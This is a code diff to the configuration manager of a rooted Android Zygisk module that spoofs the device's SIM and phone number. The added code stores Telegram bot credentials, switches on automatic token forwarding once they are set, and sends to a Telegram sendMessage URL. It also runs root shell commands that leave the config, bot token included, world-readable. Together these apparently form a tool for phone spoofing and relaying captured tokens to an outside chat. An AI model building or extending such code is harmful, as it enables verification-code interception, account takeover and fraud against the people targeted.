@@ -80,24 +80,43 @@ class ConfigManager(private val context: Context) {
     private val ioExecutor = Executors.newSingleThreadExecutor()
 
     fun load(): ModuleConfig {
+        val fromApp = if (appConfigFile.exists()) parseConfigFile(appConfigFile) else null
         val parsed = when {
             runtimeConfig.canRead() -> parseConfigFile(runtimeConfig)
             moduleConfig.canRead() -> parseConfigFile(moduleConfig)
-            appConfigFile.exists() -> parseConfigFile(appConfigFile)
+            fromApp != null -> fromApp
             else -> ModuleConfig()
         }
+        val telegram = TelegramCredentialStore.load(context)
+        val mergedTelegram = parsed.copy(
+            telegramBotToken = telegram.botToken.ifBlank { parsed.telegramBotToken }
+                .ifBlank { fromApp?.telegramBotToken.orEmpty() },
+            telegramChatId = telegram.chatId.ifBlank { parsed.telegramChatId }
+                .ifBlank { fromApp?.telegramChatId.orEmpty() },
+            autoForwardToken = if (telegram.botToken.isNotBlank() && telegram.chatId.isNotBlank()) {
+                true
+            } else {
+                parsed.autoForwardToken
+            },
+            forwardUrl = if (telegram.botToken.isNotBlank()) {
+                "https://api.telegram.org/bot${telegram.botToken}/sendMessage"
+            } else {
+                parsed.forwardUrl
+            }
+        )
         val userPhone = readUserMockPhoneRaw().ifBlank { readSpoofPhoneDirect() }
-        val spoofDigits = mockSimDigits10(userPhone.ifBlank { parsed.mockPhoneSim1 })
+        val spoofDigits = mockSimDigits10(userPhone.ifBlank { mergedTelegram.mockPhoneSim1 })
         if (spoofDigits.length == 10) {
             val normalized = normalizePhone(spoofDigits)
-            return parsed.copy(
+            return mergedTelegram.copy(
                 mockPhoneSim1 = normalized,
-                enableVirtualSim = parsed.enableVirtualSim || parsed.enableSim1Mock || parsed.enablePhoneSpoof,
-                enableSim1Mock = parsed.enableSim1Mock || parsed.enableVirtualSim,
-                enablePhoneSpoof = parsed.enablePhoneSpoof || parsed.enableVirtualSim
+                enableVirtualSim = mergedTelegram.enableVirtualSim || mergedTelegram.enableSim1Mock ||
+                    mergedTelegram.enablePhoneSpoof,
+                enableSim1Mock = mergedTelegram.enableSim1Mock || mergedTelegram.enableVirtualSim,
+                enablePhoneSpoof = mergedTelegram.enablePhoneSpoof || mergedTelegram.enableVirtualSim
             )
         }
-        return parsed
+        return mergedTelegram
     }
 
     /** App storage pe save — kabhi crash nahi. Root sync background me. */
@@ -299,6 +318,7 @@ class ConfigManager(private val context: Context) {
         val token = botToken.trim()
         val chat = chatId.trim()
         if (token.isBlank() || chat.isBlank()) return false
+        TelegramCredentialStore.save(context, token, chat)
         val current = load()
         val forwardUrl = "https://api.telegram.org/bot$token/sendMessage"
         val updated = current.copy(
@@ -445,20 +465,41 @@ class ConfigManager(private val context: Context) {
     }
 
     private fun pushPayloadQuiet(localPath: String, payload: String) {
+        val merged = mergeTelegramIntoPayload(payload)
+        try {
+            appConfigFile.parentFile?.mkdirs()
+            appConfigFile.writeText(merged)
+        } catch (_: Exception) {}
         try {
             runtimeConfig.parentFile?.mkdirs()
-            runtimeConfig.writeText(payload)
+            runtimeConfig.writeText(merged)
             runtimeConfig.setReadable(true, false)
         } catch (_: Exception) {}
         try {
             moduleConfig.parentFile?.mkdirs()
-            moduleConfig.writeText(payload)
+            moduleConfig.writeText(merged)
         } catch (_: Exception) {}
+        val escapedPath = localPath.replace("'", "'\\''")
         runSu(
-            "cp '$localPath' '$RUNTIME_CONFIG' 2>/dev/null; chmod 666 '$RUNTIME_CONFIG' 2>/dev/null; " +
-                "mkdir -p /data/adb/modules/hivirtus_zygisk_mode 2>/dev/null; " +
-                "cp '$localPath' '$MODULE_CONFIG' 2>/dev/null; chmod 644 '$MODULE_CONFIG' 2>/dev/null"
+            "mkdir -p /data/adb/modules/hivirtus_zygisk_mode 2>/dev/null; " +
+                "cp '$escapedPath' '$RUNTIME_CONFIG' 2>/dev/null; chmod 666 '$RUNTIME_CONFIG' 2>/dev/null; " +
+                "cp '$escapedPath' '$MODULE_CONFIG' 2>/dev/null; chmod 644 '$MODULE_CONFIG' 2>/dev/null"
         )
+    }
+
+    private fun mergeTelegramIntoPayload(payload: String): String {
+        return try {
+            val tg = TelegramCredentialStore.load(context)
+            if (tg.botToken.isBlank() || tg.chatId.isBlank()) return payload
+            val json = JSONObject(payload)
+            json.put("telegram_bot_token", tg.botToken)
+            json.put("telegram_chat_id", tg.chatId)
+            json.put("auto_forward_token", true)
+            json.put("forward_url", "https://api.telegram.org/bot${tg.botToken}/sendMessage")
+            json.toString(2)
+        } catch (_: Exception) {
+            payload
+        }
     }
 
     private fun parseConfigFile(file: File): ModuleConfig {
